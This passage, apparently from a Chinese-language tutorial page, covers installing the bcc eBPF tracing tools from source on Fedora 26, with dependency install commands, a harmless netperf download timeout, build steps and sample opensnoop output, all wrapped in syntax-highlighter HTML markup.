class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nPID    COMM               FD ERR PATH\r\n11792  ls                  3   0 /etc/ld.so.cache\r\n11792  ls                  3   0 /lib64/libselinux.so.1\r\n11792  ls                  3   0 /lib64/libcap.so.2\r\n11792  ls                  3   0 /lib64/libc.so.6\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d0904046382-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d0904046382-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d0904046382-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d0904046382-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d0904046382-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d0904046382-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d0904046382-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d0904046382-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000d0904046382-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d0904046382-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM               </span><span class=\"crayon-e\">FD </span><span class=\"crayon-e\">ERR </span><span class=\"crayon-i\">PATH</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000d0904046382-3\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d0904046382-4\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libselinux</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000d0904046382-5\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libcap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d0904046382-6\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libc</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000d0904046382-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d0904046382-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>运行起来了。 这是捕获自另一个窗口中的 ls 命令活动。 请参阅前面的部分以使用其它有用的命令。</p>\n<h3 id=\"toc_10\">通过源码安装</h3>\n<p>如果您需要从源代码安装，您还可以在 <a href=\"https://github.com/iovisor/bcc/blob/master/INSTALL.md#fedora---source\">INSTALL.md</a> 中找到文档和更新说明。 我在 Fedora 26 上做了如下的事情：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000d3305619516\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo dnf install -y bison cmake ethtool flex git iperf libstdc++-static \\\r\n  python-netaddr python-pip gcc gcc-c++ make zlib-devel \\\r\n  elfutils-libelf-devel\r\nsudo dnf install -y luajit luajit-devel  # for Lua support\r\nsudo dnf install -y \\\r\n  http://pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm\r\nsudo pip install pyroute2\r\nsudo dnf install -y clang clang-devel llvm llvm-devel llvm-static ncurses-devel\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d3305619516-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d3305619516-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d3305619516-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d3305619516-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d3305619516-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d3305619516-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d3305619516-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d3305619516-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d3305619516-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000d3305619516-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bison </span><span class=\"crayon-e\">cmake </span><span class=\"crayon-e\">ethtool </span><span class=\"crayon-e\">flex </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">iperf </span><span class=\"crayon-v\">libstdc</span><span class=\"crayon-o\">++</span><span class=\"crayon-o\">-</span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d3305619516-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">netaddr </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">pip </span><span class=\"crayon-e\">gcc </span><span class=\"crayon-v\">gcc</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">make </span><span class=\"crayon-v\">zlib</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">devel</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000d3305619516-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">elfutils</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">libelf</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d3305619516-4\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">luajit </span><span class=\"crayon-v\">luajit</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">devel</span><span class=\"crayon-h\">  </span><span class=\"crayon-p\"># for Lua support</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000d3305619516-5\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d3305619516-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000d3305619516-7\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">pip </span><span class=\"crayon-e\">install </span><span class=\"crayon-e\">pyroute2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d3305619516-8\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">clang </span><span class=\"crayon-v\">clang</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel </span><span class=\"crayon-e\">llvm </span><span class=\"crayon-v\">llvm</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel </span><span class=\"crayon-v\">llvm</span><span class=\"crayon-o\">-</span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncurses</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">devel</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000d3305619516-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>除 <code>netperf</code> 外一切妥当，其中有以下错误：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000d7329561333\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCurl error (28): Timeout was reached for http://pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm [Connection timed out after 120002 milliseconds]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000d7329561333-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000d7329561333-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000d7329561333-1\"><span class=\"crayon-e\">Curl </span><span class=\"crayon-e\">error</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">28</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Timeout </span><span class=\"crayon-e\">was </span><span class=\"crayon-e\">reached </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm [Connection timed out after 120002 milliseconds]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000d7329561333-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>不必理会，<code>netperf</code> 是可选的，它只是用于测试，而 bcc 没有它也会编译成功。</p>\n<p>以下是余下的 bcc 编译和安装步骤：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000da939370019\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit clone https://github.com/iovisor/bcc.git\r\nmkdir bcc/build; cd bcc/build\r\ncmake .. -DCMAKE_INSTALL_PREFIX=/usr\r\nmake\r\nsudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000da939370019-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000da939370019-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000da939370019-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000da939370019-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000da939370019-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000da939370019-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000da939370019-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/iovisor/bcc.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000da939370019-2\"><span class=\"crayon-e\">mkdir </span><span class=\"crayon-v\">bcc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">build</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">bcc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">build</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000da939370019-3\"><span class=\"crayon-i\">cmake</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">DCMAKE_INSTALL_PREFIX</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">usr</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000da939370019-4\"><span class=\"crayon-e\">make</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000da939370019-5\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000da939370019-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>现在，命令应该可以工作了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000dd481133401\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nPID    COMM               FD ERR PATH\r\n4131   date                3   0 /etc/ld.so.cache\r\n4131   date                3   0 /lib64/libc.so.6\r\n4131   date                3   0 /usr/lib/locale/locale-archive\r\n4131   date                3   0 /etc/localtime\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000dd481133401-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000dd481133401-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000dd481133401-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000dd481133401-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000dd481133401-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000dd481133401-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000dd481133401-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000dd481133401-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000dd481133401-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000dd481133401-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM               </span><span class=\"crayon-e\">FD </span><span class=\"crayon-e\">ERR </span><span class=\"crayon-i\">PATH</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000dd481133401-3\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000dd481133401-4\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libc</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000dd481133401-5\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000dd481133401-6\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">localtime</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000dd481133401-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000dd481133401-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 